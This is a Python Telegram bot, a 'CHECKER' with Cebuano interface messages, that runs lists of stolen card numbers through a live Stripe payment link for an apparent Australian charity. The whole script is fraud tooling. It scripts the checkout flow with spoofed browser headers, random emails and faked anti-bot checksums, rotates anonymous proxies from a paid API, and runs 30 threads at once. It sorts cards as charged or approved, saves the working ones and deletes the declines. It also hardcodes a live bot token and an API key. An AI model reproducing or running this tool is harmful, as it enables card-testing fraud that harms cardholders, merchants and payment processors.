import requests
import sys
import os
import time
import concurrent.futures
import threading
import random
import uuid
import re
import string
import urllib.parse
from telebot import TeleBot, types
from functools import partial
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

if sys.platform == 'win32':
    os.system('chcp 65001 > nul')

BOT_TOKEN = "8675963323:AAFdOHR_-qhX_TPTOOESKOWWbg6ToEhIm50"
bot = TeleBot(BOT_TOKEN)

BUY_URL = "https://buy.stripe.com/28o2apdMBcTa69G3cf"
PAYMENT_LINK_ID = BUY_URL.rstrip("/").split("/")[-1]

stats = {"charged": 0, "approved": 0, "declined": 0, "error": 0}
proxies_list = []
proxy_lock = threading.Lock()

CARD_ICON = '→ Card →'
GATE_ICON = '→ Gate →'
STATUS_ICON = '→ Status →'
RESP_ICON = '→ Response →'
BRAND_ICON = '→ Brand →'
BANK_ICON = '→ Bank →'
COUNTRY_ICON = '→ Country →'
DEV_ICON = '→ Dev →'

STATUS_EMOJI = {"CHARGED": "🔥", "APPROVED": "✅", "DECLINED": "❌", "ERROR": "⚠️"}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
]

def fetch_good_proxies(chat_id):
    global proxies_list
    bot.send_message(chat_id, "🔄 Nag-download og bag-ong elite proxies (Very Fast)...")
    try:
        url = "https://api.good-proxies.ru/api"
        params = {'key': "3269305ce8094af10e5933fe67db8529", 'ping': "3000", 'time': "300", 'anon': "elite", 'access': "supportsHttps"}
        headers = {'User-Agent': "okhttp/4.10.0"}
        response = requests.get(url, params=params, headers=headers, timeout=15)
        if response.status_code == 200:
            new_proxies = [line.strip() for line in response.text.splitlines() if line.strip() and ':' in line]
            if new_proxies:
                proxies_list = new_proxies
                bot.send_message(chat_id, f"✅ **VERY FAST** - Nakarga {len(proxies_list)} elite proxies!")
                return True
    except:
        pass
    bot.send_message(chat_id, "⚠️ Wala makakuha proxies.")
    return False

def get_bin_info(bin_code):
    try:
        res = requests.get(f"https://bins.antipublic.cc/bins/{bin_code}", timeout=10)
        if res.status_code == 200:
            data = res.json()
            return data.get('brand', 'UNKNOWN'), data.get('bank', 'UNKNOWN'), data.get('country_name', 'UNKNOWN'), data.get('country_flag', '')
    except:
        pass
    return "UNKNOWN", "UNKNOWN", "UNKNOWN", ""

def format_proxy(p, p_type="http"):
    if not p: return None
    p = p.strip()
    if "://" in p: p = p.split("://")[-1]
    if p_type == "https": p_type = "http"
    pre = "socks4://" if p_type == "socks4" else ("socks5://" if p_type == "socks5" else "http://")
    if "@" in p: return f"{pre}{p}"
    parts = p.split(':')
    if len(parts) == 2:
        return f"{pre}{parts[0]}:{parts[1]}"
    if len(parts) == 4:
        if parts[1].isdigit() and len(parts[1]) <= 5:
            return f"{pre}{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        return f"{pre}{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
    return f"{pre}{p}"

def generate_random_email():
    digits = ''.join(random.choices(string.digits, k=8))
    return f"Xoarch{digits}@gmail.com"

def _rand_id(k=32):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=k))

def decline_message(code, default_msg):
    mapping = {"incorrect_cvc": "Your security code is incorrect", "incorrect_number": "Your card number is incorrect.", "insufficient_funds": "Your card has insufficient funds."}
    return mapping.get(code, default_msg)

# ================== FULL CHECK_CC FROM stripedaw.py ==================
def check_cc(cc_full, proxy=None, proxy_type="http"):
    session = requests.Session()
    if proxy:
        session.proxies = {"http": format_proxy(proxy, proxy_type), "https": format_proxy(proxy, proxy_type)}
    try:
        data_parts = cc_full.strip().split('|')
        cc, mm, yy, cvv = data_parts[0], data_parts[1], data_parts[2], data_parts[3].replace('.', '')
        if len(yy) == 4: yy = yy[-2:]
        name = data_parts[4].strip() if len(data_parts) > 4 else "Card Holder"
    except:
        return "ERROR", "Invalid format", "UNKNOWN"

    email = generate_random_email()

    try:
        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language": "vi,en-US;q=0.9,en;q=0.8",
            "sec-ch-ua": '"Not:A-Brand";v="99", "Microsoft Edge";v="145", "Chromium";v="145"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "document", "sec-fetch-mode": "navigate",
            "sec-fetch-site": "none", "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": random.choice(USER_AGENTS),
        }
        session.get(BUY_URL, headers=headers, timeout=20)
        html = session.get(BUY_URL, headers=headers, timeout=20).text

        pk_live = None
        m = re.search(r"pk_live_[A-Za-z0-9]+", html)
        if m: pk_live = m.group(0)
        cs_id = None
        m = re.search(r"cs_live_[A-Za-z0-9]+", html)
        if m: cs_id = m.group(0)

        merchant_ui_headers = {
            "accept": "application/json", "accept-language": "vi,en-US;q=0.9,en;q=0.8",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://buy.stripe.com", "referer": "https://buy.stripe.com/",
            "sec-ch-ua": '"Not:A-Brand";v="99", "Microsoft Edge";v="145", "Chromium";v="145"',
            "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-site",
            "user-agent": random.choice(USER_AGENTS),
        }
        payment_link_form = {
            "eid": "NA", "browser_locale": "vi",
            "browser_timezone": "Asia/Saigon",
            "referrer_origin": "https://karibuwomenhome.com.au",
        }
        pl_resp = session.post(
            f"https://merchant-ui-api.stripe.com/payment-links/{PAYMENT_LINK_ID}",
            headers=merchant_ui_headers, data=urllib.parse.urlencode(payment_link_form), timeout=20
        )

        checkout_session_id = cs_id
        pl_data = {}
        pl_expected_amount = None
        pl_config_id = None
        pl_currency = "aud"
        if pl_resp.ok:
            try:
                pl_data = pl_resp.json()
                checkout_session_id = pl_data.get("session_id") or checkout_session_id
                pl_config_id = pl_data.get("config_id")
                pl_currency = pl_data.get("currency") or "aud"
                lig = pl_data.get("line_item_group") or {}
                pl_expected_amount = lig.get("total") or lig.get("due") or lig.get("subtotal")
                if pl_expected_amount is not None:
                    pl_expected_amount = int(pl_expected_amount)
            except:
                pass

        if not pk_live:
            pk_live = "pk_live_51QRg19RoxmaXTuY55nJGUChdohsr8gq6tGgVsA6viZ9l6h2UJ2UmyaqM4yng0sjiNhPImBr6XS0KXJY6nvYRVxAq00eT8UvNBF"
        if not checkout_session_id:
            checkout_session_id = "cs_live_a1r2cbZ7xviYNl1hbdjN4HQNUw6hKvfjKdCpvKR48pVpsxvoFypXlLvkfr"

        muid = "bf10e066-3dde-43cf-990c-7f526e267148"
        guid = "598209cc-46fa-4e08-b69c-22b3316aba05"
        sid = "4318288f-e6f2-4e62-bc88-4d5ccc435a1b"
        stripe_js_id = str(uuid.uuid4())
        currency = pl_currency

        api_headers = {
            "accept": "application/json", "accept-language": "vi,en-US;q=0.9,en;q=0.8",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com", "priority": "u=1, i",
            "referer": "https://js.stripe.com/",
            "sec-ch-ua": '"Not:A-Brand";v="99", "Microsoft Edge";v="145", "Chromium";v="145"',
            "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-site",
            "user-agent": random.choice(USER_AGENTS),
        }

        elements_sessions_params = {
            "client_betas[0]": "google_pay_beta_1",
            "client_betas[1]": "disable_deferred_intent_client_validation_beta_1",
            "client_betas[2]": "blocked_card_brands_beta_2",
            "deferred_intent[mode]": "payment",
            "deferred_intent[amount]": str(pl_expected_amount) if pl_expected_amount else "100",
            "deferred_intent[currency]": currency,
            "deferred_intent[payment_method_types][0]": "card",
            "deferred_intent[payment_method_types][1]": "link",
            "deferred_intent[capture_method]": "automatic_async",
            "currency": currency, "key": pk_live,
            "elements_init_source": "payment_link", "hosted_surface": "checkout",
            "referrer_host": "buy.stripe.com", "stripe_js_id": stripe_js_id,
            "locale": "vi", "type": "deferred_intent",
            "checkout_session_id": checkout_session_id,
        }
        response_es = session.get("https://api.stripe.com/v1/elements/sessions", params=elements_sessions_params, headers=api_headers, timeout=20)
        es_data = response_es.json()
        expected_amount_cents = pl_expected_amount
        if expected_amount_cents is None:
            sess = es_data.get("session") or es_data
            expected_amount_cents = sess.get("amount_total") or sess.get("amount_subtotal") or es_data.get("amount")
        if expected_amount_cents is None:
            expected_amount_cents = 100
        expected_amount_cents = int(expected_amount_cents)
        expected_amount_str = str(expected_amount_cents)

        buy_headers = {**api_headers, "origin": "https://buy.stripe.com", "referer": "https://buy.stripe.com/"}

        form_pm = {
            "type": "card",
            "card[number]": cc, "card[cvc]": cvv,
            "card[exp_month]": mm, "card[exp_year]": yy,
            "billing_details[name]": name, "billing_details[email]": email,
            "billing_details[address][country]": "VN",
            "guid": guid, "muid": muid, "sid": sid, "key": pk_live,
            "payment_user_agent": "stripe.js/148043f9d7; stripe-js-v3/148043f9d7; payment-link; checkout",
            "client_attribution_metadata[client_session_id]": stripe_js_id,
            "client_attribution_metadata[checkout_session_id]": checkout_session_id,
            "client_attribution_metadata[merchant_integration_source]": "checkout",
            "client_attribution_metadata[merchant_integration_version]": "payment_link",
            "client_attribution_metadata[payment_method_selection_flow]": "automatic",
            "client_attribution_metadata[checkout_config_id]": pl_config_id or "",
        }
        response_pm = session.post("https://api.stripe.com/v1/payment_methods", headers=buy_headers, data=urllib.parse.urlencode(form_pm), timeout=20)
        pm_resp = response_pm.json()
        if pm_resp.get("error"):
            err_code = pm_resp["error"].get("code", "")
            err_msg = pm_resp["error"].get("message", "Your card was declined.")
            if err_code == "insufficient_funds":
                return "APPROVED", decline_message(err_code, err_msg), "UNKNOWN"
            return "DECLINED", decline_message(err_code, err_msg), "UNKNOWN"
        pm_id = pm_resp.get("id")
        if not pm_id:
            return "ERROR", "Failed to create PaymentMethod", "UNKNOWN"

        init_checksum = _rand_id(32)
        js_checksum = "".join(random.choices(string.ascii_letters + string.digits + "\~^=[]|%#{}<>?`", k=50))
        pxvid = str(uuid.uuid4())
        rv_timestamp = "".join(random.choices(string.ascii_letters + string.digits + "&%=<>^`[];", k=120))

        confirm_form = {
            "eid": "NA", "payment_method": pm_id,
            "expected_amount": expected_amount_str,
            "last_displayed_line_item_group_details[subtotal]": expected_amount_str,
            "last_displayed_line_item_group_details[total_exclusive_tax]": "0",
            "last_displayed_line_item_group_details[total_inclusive_tax]": "0",
            "last_displayed_line_item_group_details[total_discount_amount]": "0",
            "last_displayed_line_item_group_details[shipping_rate_amount]": "0",
            "expected_payment_method_type": "card",
            "guid": guid, "muid": muid, "sid": sid, "key": pk_live,
            "version": "148043f9d7", "init_checksum": init_checksum,
            "js_checksum": js_checksum, "pxvid": pxvid,
            "passive_captcha_token": "",
            "passive_captcha_ekey": pl_data.get("site_key", ""),
            "rv_timestamp": rv_timestamp,
            "client_attribution_metadata[client_session_id]": stripe_js_id,
            "client_attribution_metadata[checkout_session_id]": checkout_session_id,
            "client_attribution_metadata[merchant_integration_source]": "checkout",
            "client_attribution_metadata[merchant_integration_version]": "payment_link",
            "client_attribution_metadata[payment_method_selection_flow]": "automatic",
            "client_attribution_metadata[checkout_config_id]": pl_config_id or "",
        }
        confirm_resp = session.post(
            f"https://api.stripe.com/v1/payment_pages/{checkout_session_id}/confirm",
            headers=buy_headers, data=urllib.parse.urlencode(confirm_form, safe=""), timeout=20
        )
        data = confirm_resp.json()

        brand = data.get("payment_method", {}).get("card", {}).get("brand", "UNKNOWN")

        if confirm_resp.status_code == 200 and isinstance(data.get("id"), str) and data["id"].startswith("ppage_"):
            return "APPROVED", "3DS Required", brand

        err = data.get("error") or {}
        if err:
            err_code = err.get("code", "")
            message = err.get("message", "Your card was declined.")
            if err.get("charge") and ("succeeded" in str(data.get("status", "")).lower()):
                return "CHARGED", "Your card was charged.", brand
            if err_code == "insufficient_funds":
                return "APPROVED", decline_message(err_code, message), brand
            return "DECLINED", decline_message(err_code, message), brand

        if data.get("status") in ("succeeded", "complete"):
            return "CHARGED", "Your card was charged.", brand

        return "DECLINED", "Unknown response", brand
    except requests.exceptions.RequestException as e:
        return "ERROR", f"Request failed: {str(e)[:150]}", "UNKNOWN"
    except Exception as e:
        return "ERROR", f"Gateway Error: {str(e)[:150]}", "UNKNOWN"

def build_block(cc_line, status, response, brand, bank, country, flag):
    emoji = STATUS_EMOJI.get(status, "")
    return f"""────────────────────────────────────────
{CARD_ICON} {cc_line}
{GATE_ICON} Stripe $1
{STATUS_ICON} {status} {emoji}
{RESP_ICON} {response}
{BRAND_ICON} {brand}
{BANK_ICON} {bank}
{COUNTRY_ICON} {country} {flag}
{DEV_ICON} Haste
────────────────────────────────────────"""

def save_result(block, status):
    if status in ["CHARGED", "APPROVED"]:
        with open(f"{status.lower()}.txt", "a", encoding="utf-8") as f:
            f.write(block + "\n\n")

def save_approved_list(cc_line):
    with open("approved_list.txt", "a", encoding="utf-8") as f:
        f.write(cc_line + "\n")

def clean_declined_files():
    for f in ["declined.txt", "error.txt"]:
        if os.path.exists(f):
            try:
                os.remove(f)
            except:
                pass

def worker(cc_line, use_proxy=False, proxy_type="http", chat_id=None):
    attempt = 0
    while True:
        attempt += 1
        proxy = None
        if use_proxy and proxies_list:
            with proxy_lock:
                proxy = random.choice(proxies_list)
        status, response, brand_auto = check_cc(cc_line, proxy, proxy_type)
        if status in ["CHARGED", "APPROVED", "DECLINED"]:
            break
        time.sleep(random.uniform(0.8, 2.0))

    bin_code = cc_line[:6]
    brand_bin, bank, country, flag = get_bin_info(bin_code)
    brand = brand_bin if brand_bin != "UNKNOWN" else brand_auto.title()

    if status == "CHARGED": stats["charged"] += 1
    elif status == "APPROVED": stats["approved"] += 1
    elif status == "ERROR": stats["error"] += 1
    else: stats["declined"] += 1

    block = build_block(cc_line, status, response, brand, bank, country, flag)

    if chat_id:
        try:
            bot.send_message(chat_id, f"`{cc_line}` → **{status}** {STATUS_EMOJI.get(status, '')} (Try {attempt})\n{response}", parse_mode='Markdown')
            if status in ["CHARGED", "APPROVED"]:
                bot.send_message(chat_id, f"```{block}```", parse_mode='Markdown')
        except:
            pass

    if status in ["CHARGED", "APPROVED"]:
        save_result(block, status)
        clean_cc = '|'.join(cc_line.split('|')[:4])
        save_approved_list(clean_cc)

@bot.message_handler(commands=['start'])
def start(msg):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row('🔹 SINGLE CHECK', '🔹 MASS CHECK')
    markup.row('📊 STATUS', '❌ STOP')
    bot.send_message(msg.chat.id, "🟢 **HERMAN BISAK0L CHECKER** Andam na\n**Option 6 = PASAS KAAYO KAAYO Proxies**", reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(func=lambda m: True)
def handle_text(msg):
    text = msg.text.strip()
    if text == '🔹 SINGLE CHECK':
        bot.send_message(msg.chat.id, "Ipadala ang CC: `number|mm|yy|cvv`")
        bot.register_next_step_handler(msg, single_check)
    elif text == '🔹 MASS CHECK':
        bot.send_message(msg.chat.id, "I-paste ang mga card (usa matag linya):")
        bot.register_next_step_handler(msg, mass_check_paste)
    elif text == '📊 STATUS':
        bot.send_message(msg.chat.id, f"**Stats**\nCharged: {stats['charged']}\nApproved: {stats['approved']}\nDeclined: {stats['declined']}\nError: {stats['error']}", parse_mode='Markdown')

def single_check(msg):
    cc = msg.text.strip()
    bot.send_message(msg.chat.id, "🔄 Nag-check...")
    status, response, brand_auto = check_cc(cc)
    bin_code = cc[:6]
    brand_bin, bank, country, flag = get_bin_info(bin_code)
    brand = brand_bin if brand_bin != "UNKNOWN" else brand_auto.title()
    block = build_block(cc, status, response, brand, bank, country, flag)
    bot.send_message(msg.chat.id, f"```{block}```", parse_mode='Markdown')
    if status in ["CHARGED", "APPROVED"]:
        save_result(block, status)

def mass_check_paste(msg):
    lines = [line.strip() for line in msg.text.splitlines() if line.strip() and '|' in line]
    ccs = lines
    if not ccs:
        bot.send_message(msg.chat.id, "Walay valid nga cards.")
        return
    bot.send_message(msg.chat.id, f"Nakarga {len(ccs)} ka cards.\n1 HTTP\n2 HTTPS\n3 SOCKS4\n4 SOCKS5\n5 PROXYLESS\n6 AUTO GOOD-PROXIES (VERY VERY FAST)")
    bot.register_next_step_handler(msg, lambda m: mass_proxy_choice(m, ccs))

def mass_proxy_choice(msg, ccs):
    ch = msg.text.strip()
    if ch == '6':
        fetch_good_proxies(msg.chat.id)
        start_mass_check(ccs, True, "http", msg.chat.id)
    elif ch in ['1','2','3','4']:
        bot.send_message(msg.chat.id, "I-paste ang proxies o `skip`:")
        bot.register_next_step_handler(msg, lambda m: mass_proxy_paste(m, ccs, ch))
    else:
        start_mass_check(ccs, False, "http", msg.chat.id)

def mass_proxy_paste(msg, ccs, p_type_idx):
    txt = msg.text.strip()
    if txt.lower() == 'skip':
        start_mass_check(ccs, False, "http", msg.chat.id)
        return
    global proxies_list
    proxies_list = [line.strip() for line in txt.splitlines() if line.strip()]
    use = len(proxies_list) > 0
    ptype = {'2':'https','3':'socks4','4':'socks5'}.get(p_type_idx, 'http')
    bot.send_message(msg.chat.id, f"Nakarga {len(proxies_list)} proxies. Nagsugod na...")
    start_mass_check(ccs, use, ptype, msg.chat.id)

def start_mass_check(ccs, use_proxy, proxy_type, chat_id):
    stats.update({"charged":0,"approved":0,"declined":0,"error":0})
    bot.send_message(chat_id, f"🔄 Nagsugod sa {len(ccs)} ka cards... **VERY VERY FAST MODE**")
    worker_args = partial(worker, use_proxy=use_proxy, proxy_type=proxy_type, chat_id=chat_id)
    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
        ex.map(worker_args, ccs)
    clean_declined_files()
    bot.send_message(chat_id, f"""✅ **Human na ang Check!**
Charged: {stats['charged']}
Approved: {stats['approved']}
Declined & Error: gidelete na""")

if __name__ == "__main__":
    print("HERMAN BISAK0L CHECKER - PASAS KAAYO KAAYO AUTO PROXIES")
    bot.infinity_polling()